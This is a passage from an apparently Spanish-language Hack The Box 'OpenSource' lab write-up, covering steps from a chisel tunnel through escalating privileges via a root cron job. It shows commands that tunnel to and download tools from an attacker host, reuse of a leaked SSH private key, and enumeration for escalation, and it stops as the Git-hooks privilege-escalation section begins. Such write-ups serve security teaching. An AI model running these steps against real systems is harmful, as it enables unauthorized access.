+<li>Contenedor como cliente, aplicando <strong>port forwarding</strong> hacia nuestro <strong>puerto 3000</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/tmp <span style="color:#75715e"># ./chisel client Tu_IP:1234 R:3000:172.17.0.1:3000</span>
+</span></span><span style="display:flex;"><span>./chisel client Tu_IP:1234 R:3000:172.17.0.1:3000
+</span></span><span style="display:flex;"><span>2024/10/08 07:05:21 client: Connecting to ws://Tu_IP:1234
+</span></span><span style="display:flex;"><span>2024/10/08 07:05:22 client: Connected <span style="color:#f92672">(</span>Latency 161.096577ms<span style="color:#f92672">)</span>
+</span></span></code></pre></div><ul>
+<li>Comprueba si ya está funcionando nuestro <strong>puerto 3000</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>lsof -i:3000
+</span></span><span style="display:flex;"><span>COMMAND    PID USER   FD   TYPE  DEVICE SIZE/OFF NODE NAME
+</span></span><span style="display:flex;"><span>chisel  <span style="color:#ae81ff">311354</span> root    7u  IPv6 <span style="color:#ae81ff">1075283</span>      0t0  TCP *:3000 <span style="color:#f92672">(</span>LISTEN<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Una vez realizado esto, podemos entrar desde el navegador al <strong>localhost</strong> al puerto 3000 para ver la página de <strong>Gitea</strong>:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-opensource/Captura25.png">
+</p>
+<h3 id="ssh">Obteniendo Llave Privada y Entrando a Servicio SSH</h3>
+<p>Muy bien, hay una opción para iniciar sesión. Entra ahí y mete el usuario y contraseña que encontramos en el <strong>repositorio de git</strong>:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-opensource/Captura26.png">
+</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-opensource/Captura27.png">
+</p>
+<p>Bien, vemos que se creó un repositorio que, al parecer, es un <strong>backup</strong> de algo. Entremos y veamos de que se trata:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-opensource/Captura28.png">
+</p>
+<p>Observa, hay un directorio de <strong>SSH</strong>, donde normalmente se almacenan las llaves para entrar.</p>
+<p>Entremos:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-opensource/Captura29.png">
+</p>
+<p>Tenemos la llave privada para entrar al <strong>servicio SSH</strong>.</p>
+<p>Vamos a copiarla y a prepararla para entrar a este servicio:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nano id_rsa
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>chmod <span style="color:#ae81ff">600</span> id_rsa
+</span></span></code></pre></div><p>Y probemosla:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh -i id.rsa dev01@10.10.11.164
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 18.04.5 LTS <span style="color:#f92672">(</span>GNU/Linux 4.15.0-176-generic x86_64<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>dev01@opensource:~$ whoami
+</span></span><span style="display:flex;"><span>dev01
+</span></span></code></pre></div><p>Ya solo busca la flag del usuario:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dev01@opensource:~$ ls
+</span></span><span style="display:flex;"><span>user.txt
+</span></span><span style="display:flex;"><span>dev01@opensource:~$ cat user.txt
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><h2 id="Post">Post Explotación</h2>
+<h3 id="enum">Enumeración de Servicio SSH</h3>
+<p>Vamos a ver qué permisos tenemos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dev01@opensource:/$ sudo -l
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> dev01: 
+</span></span><span style="display:flex;"><span>Sorry, user dev01 may not run sudo on opensource.
+</span></span></code></pre></div><p>No tenemos <strong>permisos SUDO</strong>.</p>
+<p>Ahora a qué grupos pertenecemos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dev01@opensource:/$ id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>dev01<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>dev01<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>dev01<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Nada útil.</p>
+<p>Por curiosidad, veamos la versión del SO:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dev01@opensource:/$ uname -a
+</span></span><span style="display:flex;"><span>Linux opensource 4.15.0-176-generic <span style="color:#75715e">#185-Ubuntu SMP Tue Mar 29 17:40:04 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span></span></code></pre></div><p>Veamos si hay algún binario al que tengamos acceso:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dev01@opensource:/$ find / -perm -4000 2&gt;/dev/null -ls
+</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">133</span>    <span style="color:#ae81ff">121</span> -rwsr-xr-x   <span style="color:#ae81ff">1</span> root     root       <span style="color:#ae81ff">123464</span> Mar  <span style="color:#ae81ff">3</span>  <span style="color:#ae81ff">2022</span> /snap/snapd/15177/usr/lib/snapd/snap-confine
+</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">135</span>    <span style="color:#ae81ff">121</span> -rwsr-xr-x   <span style="color:#ae81ff">1</span> root     root       <span style="color:#ae81ff">123560</span> Apr  <span style="color:#ae81ff">8</span>  <span style="color:#ae81ff">2022</span> /snap/snapd/15534/usr/lib/snapd/snap-confine
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">56</span>     <span style="color:#ae81ff">43</span> -rwsr-xr-x   <span style="color:#ae81ff">1</span> root     root        <span style="color:#ae81ff">43088</span> Sep <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2020</span> /snap/core18/2344/bin/mount
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">65</span>     <span style="color:#ae81ff">63</span> -rwsr-xr-x   <span style="color:#ae81ff">1</span> root     root        <span style="color:#ae81ff">64424</span> Jun <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">2019</span> /snap/core18/2344/bin/ping
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">81</span>     <span style="color:#ae81ff">44</span> -rwsr-xr-x   <span style="color:#ae81ff">1</span> root     root        <span style="color:#ae81ff">44664</span> Jan <span style="color:#ae81ff">25</span>  <span style="color:#ae81ff">2022</span> /snap/core18/2344/bin/su
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">99</span>     <span style="color:#ae81ff">27</span> -rwsr-xr-x   <span style="color:#ae81ff">1</span> root     root        <span style="color:#ae81ff">26696</span> Sep <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2020</span> /snap/core18/2344/bin/umount
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">1721</span>     <span style="color:#ae81ff">75</span> -rwsr-xr-x   <span style="color:#ae81ff">1</span> root     root        <span style="color:#ae81ff">76496</span> Jan <span style="color:#ae81ff">25</span>  <span style="color:#ae81ff">2022</span> /snap/core18/2344/usr/bin/chfn
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">1723</span>     <span style="color:#ae81ff">44</span> -rwsr-xr-x   <span style="color:#ae81ff">1</span> root     root        <span style="color:#ae81ff">44528</span> Jan <span style="color:#ae81ff">25</span>  <span style="color:#ae81ff">2022</span> /snap/core18/2344/usr/bin/chsh
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">1776</span>     <span style="color:#ae81ff">75</span> -rwsr-xr-x   <span style="color:#ae81ff">1</span> root     root        <span style="color:#ae81ff">75824</span> Jan <span style="color:#ae81ff">25</span>  <span style="color:#ae81ff">2022</span> /snap/core18/2344/usr/bin/gpasswd
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">1840</span>     <span style="color:#ae81ff">40</span> -rwsr-xr-x   <span style="color:#ae81ff">1</span> root     root        <span style="color:#ae81ff">40344</span> Jan <span style="color:#ae81ff">25</span>  <span style="color:#ae81ff">2022</span> /snap/core18/2344/usr/bin/newgrp
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">1853</span>     <span style="color:#ae81ff">59</span> -rwsr-xr-x   <span style="color:#ae81ff">1</span> root     root        <span style="color:#ae81ff">59640</span> Jan <span style="color:#ae81ff">25</span>  <span style="color:#ae81ff">2022</span> /snap/core18/2344/usr/bin/passwd
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">1944</span>    <span style="color:#ae81ff">146</span> -rwsr-xr-x   <span style="color:#ae81ff">1</span> root     root       <span style="color:#ae81ff">149080</span> Jan <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> /snap/core18/2344/usr/bin/sudo
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">2032</span>     <span style="color:#ae81ff">42</span> -rwsr-xr--   <span style="color:#ae81ff">1</span> root     systemd-resolve    <span style="color:#ae81ff">42992</span> Jun <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2020</span> /snap/core18/2344/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">2342</span>    <span style="color:#ae81ff">427</span> -rwsr-xr-x   <span style="color:#ae81ff">1</span> root     root              <span style="color:#ae81ff">436552</span> Mar  <span style="color:#ae81ff">3</span>  <span style="color:#ae81ff">2020</span> /snap/core18/2344/usr/lib/openssh/ssh-keysign
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">3487</span>     <span style="color:#ae81ff">32</span> -rwsr-xr-x   <span style="color:#ae81ff">1</span> root     root               <span style="color:#ae81ff">30800</span> Aug <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2016</span> /bin/fusermount
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">9846</span>     <span style="color:#ae81ff">28</span> -rwsr-xr-x   <span style="color:#ae81ff">1</span> root     root               <span style="color:#ae81ff">26696</span> Sep <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2020</span> /bin/umount
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">9845</span>     <span style="color:#ae81ff">44</span> -rwsr-xr-x   <span style="color:#ae81ff">1</span> root     root               <span style="color:#ae81ff">43088</span> Sep <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2020</span> /bin/mount
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">9830</span>     <span style="color:#ae81ff">44</span> -rwsr-xr-x   <span style="color:#ae81ff">1</span> root     root               <span style="color:#ae81ff">44664</span> Jan <span style="color:#ae81ff">25</span>  <span style="color:#ae81ff">2022</span> /bin/su
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">4102</span>     <span style="color:#ae81ff">64</span> -rwsr-xr-x   <span style="color:#ae81ff">1</span> root     root               <span style="color:#ae81ff">64424</span> Jun <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">2019</span> /bin/ping
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">5877</span>    <span style="color:#ae81ff">128</span> -rwsr-xr-x   <span style="color:#ae81ff">1</span> root     root              <span style="color:#ae81ff">130200</span> Feb <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2022</span> /usr/lib/snapd/snap-confine
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">1073</span>     <span style="color:#ae81ff">12</span> -rwsr-xr-x   <span style="color:#ae81ff">1</span> root     root               <span style="color:#ae81ff">10232</span> Mar <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">2017</span> /usr/lib/eject/dmcrypt-get-device
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">7423</span>    <span style="color:#ae81ff">100</span> -rwsr-xr-x   <span style="color:#ae81ff">1</span> root     root              <span style="color:#ae81ff">100760</span> Nov <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2018</span> /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">23998</span>     <span style="color:#ae81ff">44</span> -rwsr-xr--   <span style="color:#ae81ff">1</span> root     messagebus         <span style="color:#ae81ff">42992</span> May  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">2022</span> /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">7512</span>     <span style="color:#ae81ff">16</span> -rwsr-xr-x   <span style="color:#ae81ff">1</span> root     root               <span style="color:#ae81ff">14328</span> Jan <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2022</span> /usr/lib/policykit-1/polkit-agent-helper-1
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">18252</span>    <span style="color:#ae81ff">428</span> -rwsr-xr-x   <span style="color:#ae81ff">1</span> root     root              <span style="color:#ae81ff">436552</span> Mar <span style="color:#ae81ff">30</span>  <span style="color:#ae81ff">2022</span> /usr/lib/openssh/ssh-keysign
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">6897</span>     <span style="color:#ae81ff">60</span> -rwsr-xr-x   <span style="color:#ae81ff">1</span> root     root               <span style="color:#ae81ff">59640</span> Jan <span style="color:#ae81ff">25</span>  <span style="color:#ae81ff">2022</span> /usr/bin/passwd
+</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">881</span>     <span style="color:#ae81ff">20</span> -rwsr-xr-x   <span style="color:#ae81ff">1</span> root     root               <span style="color:#ae81ff">18448</span> Jun <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">2019</span> /usr/bin/traceroute6.iputils
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">7259</span>     <span style="color:#ae81ff">40</span> -rwsr-xr-x   <span style="color:#ae81ff">1</span> root     root               <span style="color:#ae81ff">40344</span> Jan <span style="color:#ae81ff">25</span>  <span style="color:#ae81ff">2022</span> /usr/bin/newgrp
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">5703</span>     <span style="color:#ae81ff">40</span> -rwsr-xr-x   <span style="color:#ae81ff">1</span> root     root               <span style="color:#ae81ff">37136</span> Jan <span style="color:#ae81ff">25</span>  <span style="color:#ae81ff">2022</span> /usr/bin/newuidmap
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">5699</span>     <span style="color:#ae81ff">44</span> -rwsr-xr-x   <span style="color:#ae81ff">1</span> root     root               <span style="color:#ae81ff">44528</span> Jan <span style="color:#ae81ff">25</span>  <span style="color:#ae81ff">2022</span> /usr/bin/chsh
+</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">447</span>     <span style="color:#ae81ff">52</span> -rwsr-sr-x   <span style="color:#ae81ff">1</span> daemon   daemon             <span style="color:#ae81ff">51464</span> Feb <span style="color:#ae81ff">20</span>  <span style="color:#ae81ff">2018</span> /usr/bin/at
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">6896</span>     <span style="color:#ae81ff">76</span> -rwsr-xr-x   <span style="color:#ae81ff">1</span> root     root               <span style="color:#ae81ff">75824</span> Jan <span style="color:#ae81ff">25</span>  <span style="color:#ae81ff">2022</span> /usr/bin/gpasswd
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">1241</span>     <span style="color:#ae81ff">40</span> -rwsr-xr-x   <span style="color:#ae81ff">1</span> root     root               <span style="color:#ae81ff">37136</span> Jan <span style="color:#ae81ff">25</span>  <span style="color:#ae81ff">2022</span> /usr/bin/newgidmap
+</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">693</span>    <span style="color:#ae81ff">148</span> -rwsr-xr-x   <span style="color:#ae81ff">1</span> root     root              <span style="color:#ae81ff">149080</span> Jan <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> /usr/bin/sudo
+</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">718</span>     <span style="color:#ae81ff">76</span> -rwsr-xr-x   <span style="color:#ae81ff">1</span> root     root               <span style="color:#ae81ff">76496</span> Jan <span style="color:#ae81ff">25</span>  <span style="color:#ae81ff">2022</span> /usr/bin/chfn
+</span></span></code></pre></div><p>Nada que podamos usar.</p>
+<p>Lo que nos faltaría es ver si hay alguna <strong>tarea CRON</strong> ejecutándose. Esto lo revisaremos con <strong>pspy</strong>.</p>
+<p>Descárgalo aquí:</p>
+<ul>
+<li><a href="https://github.com/DominicBreuker/pspy" target="_blank">Repositorio de DominicBreuker: pspy</a></li>
+</ul>
+<p>Abre un servidor de <strong>Python</strong> y descárgalo en la máquina víctima:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dev01@opensource:/tmp$ wget http://Tu_IP/pspy64
+</span></span><span style="display:flex;"><span>--2024-10-08 20:41:48--  http://Tu_IP/pspy64
+</span></span><span style="display:flex;"><span>Connecting to Tu_IP:80... connected.
+</span></span><span style="display:flex;"><span>HTTP request sent, awaiting response... <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>Length: <span style="color:#ae81ff">3104768</span> <span style="color:#f92672">(</span>3.0M<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>application/octet-stream<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Saving to: ‘pspy64’
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pspy64    100%<span style="color:#f92672">[==================</span>&gt;<span style="color:#f92672">]</span>   2.96M   430KB/s    in 7.2s    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2024-10-08 20:41:56 <span style="color:#f92672">(</span><span style="color:#ae81ff">420</span> KB/s<span style="color:#f92672">)</span> - ‘pspy64’ saved <span style="color:#f92672">[</span>3104768/3104768<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>Y ejecutemos el <strong>pspy</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dev01@opensource:/tmp$ ./pspy64 
+</span></span><span style="display:flex;"><span>pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>     ██▓███    ██████  ██▓███ ▓██   ██▓
+</span></span><span style="display:flex;"><span>    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+</span></span><span style="display:flex;"><span>    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+</span></span><span style="display:flex;"><span>    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+</span></span><span style="display:flex;"><span>    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+</span></span><span style="display:flex;"><span>    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
+</span></span><span style="display:flex;"><span>    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
+</span></span><span style="display:flex;"><span>    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
+</span></span><span style="display:flex;"><span>                   ░           ░ ░     
+</span></span><span style="display:flex;"><span>                               ░ ░
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2024/10/08 20:45:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">11414</span>  | /bin/bash /usr/local/bin/git-sync 
+</span></span><span style="display:flex;"><span>2024/10/08 20:45:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">11413</span>  | /bin/sh -c /usr/local/bin/git-sync 
+</span></span><span style="display:flex;"><span>2024/10/08 20:45:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">11412</span>  | /usr/sbin/CRON -f 
+</span></span><span style="display:flex;"><span>2024/10/08 20:45:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">11415</span>  | git status --porcelain 
+</span></span><span style="display:flex;"><span>2024/10/08 20:45:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">11416</span>  | /bin/bash /usr/local/bin/git-sync 
+</span></span><span style="display:flex;"><span>2024/10/08 20:45:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">11417</span>  | git add . 
+</span></span><span style="display:flex;"><span>2024/10/08 20:45:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">11419</span>  | /bin/bash /usr/local/bin/git-sync 
+</span></span><span style="display:flex;"><span>2024/10/08 20:45:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">11420</span>  | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git 
+</span></span><span style="display:flex;"><span>2024/10/08 20:45:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">11421</span>  | 
+</span></span><span style="display:flex;"><span>2024/10/08 20:46:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">11426</span>  | /usr/sbin/CRON -f 
+</span></span><span style="display:flex;"><span>2024/10/08 20:46:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">11425</span>  | /usr/sbin/CRON -f 
+</span></span><span style="display:flex;"><span>2024/10/08 20:46:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">11424</span>  | /usr/sbin/CRON -f 
+</span></span><span style="display:flex;"><span>2024/10/08 20:46:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">11423</span>  | /usr/sbin/CRON -f 
+</span></span><span style="display:flex;"><span>2024/10/08 20:46:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">11430</span>  | /bin/sh -c /usr/local/bin/git-sync
+</span></span></code></pre></div><p>Hay un script que se está ejecutando cada cierto tiempo y después se agrega al repositorio y se sube.</p>
+<p>Veamos de que se trata:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dev01@opensource:/tmp$ cat /usr/local/bin/git-sync
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cd /home/dev01/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ! git status --porcelain; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;No changes&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>    day<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>date +<span style="color:#e6db74">&#39;%Y-%m-%d&#39;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;Changes detected, pushing..&#34;</span>
+</span></span><span style="display:flex;"><span>    git add .
+</span></span><span style="display:flex;"><span>    git commit -m <span style="color:#e6db74">&#34;Backup for </span><span style="color:#e6db74">${</span>day<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    git push origin main
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
+</span></span></code></pre></div><p>Parece que hay un repositorio de <strong>Git</strong> en el directorio <strong>/home</strong> de este usuario, en donde se revisa si hay cambios y, si los hay, agrega esos cambios y los sube a su repositorio como un backup.</p>
+<p>Veamos ese repositorio.</p>
+<h3 id="hooks">Abusando de Git Hooks para Escalar Privilegios</h3>
+<p>Entrando al repositorio, encontramos esto:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dev01@opensource:~/.git$ ls -la
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">56</span>
+</span></span><span style="display:flex;"><span>drwxrwxr-x  <span style="color:#ae81ff">8</span> dev01 dev01 <span style="color:#ae81ff">4096</span> Oct  <span style="color:#ae81ff">8</span> 21:24 .
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">7</span> dev01 dev01 <span style="color:#ae81ff">4096</span> May <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2022</span> ..
+</span></span><span style="display:flex;"><span>drwxrwxr-x  <span style="color:#ae81ff">2</span> dev01 dev01 <span style="color:#ae81ff">4096</span> May  <span style="color:#ae81ff">4</span>  <span style="color:#ae81ff">2022</span> branches
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> dev01 dev01   <span style="color:#ae81ff">22</span> Oct  <span style="color:#ae81ff">8</span> 21:24 COMMIT_EDITMSG
+</span></span><span style="display:flex;"><span>-rw-rw-r--  <span style="color:#ae81ff">1</span> dev01 dev01  <span style="color:#ae81ff">269</span> Oct  <span style="color:#ae81ff">8</span> 21:24 config
+</span></span><span style="display:flex;"><span>-rw-rw-r--  <span style="color:#ae81ff">1</span> dev01 dev01   <span style="color:#ae81ff">73</span> Mar <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2022</span> description
+</span></span><span style="display:flex;"><span>-rw-rw-r--  <span style="color:#ae81ff">1</span> dev01 dev01  <span style="color:#ae81ff">117</span> Mar <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2022</span> FETCH_HEAD
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> dev01 dev01   <span style="color:#ae81ff">21</span> May <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2022</span> HEAD
+</span></span><span style="display:flex;"><span>drwxrwxr-x  <span style="color:#ae81ff">2</span> dev01 dev01 <span style="color:#ae81ff">4096</span> May  <span style="color:#ae81ff">4</span>  <span style="color:#ae81ff">2022</span> hooks
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root  root   <span style="color:#ae81ff">845</span> Oct  <span style="color:#ae81ff">8</span> 20:26 index
+</span></span><span style="display:flex;"><span>drwxrwxr-x  <span style="color:#ae81ff">2</span> dev01 dev01 <span style="color:#ae81ff">4096</span> May  <span style="color:#ae81ff">4</span>  <span style="color:#ae81ff">2022</span> info
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">3</span> dev01 dev01 <span style="color:#ae81ff">4096</span> May  <span style="color:#ae81ff">4</span>  <span style="color:#ae81ff">2022</span> logs
+</span></span><span style="display:flex;"><span>drwxrwxr-x <span style="color:#ae81ff">44</span> dev01 dev01 <span style="color:#ae81ff">4096</span> Oct  <span style="color:#ae81ff">8</span> 20:26 objects
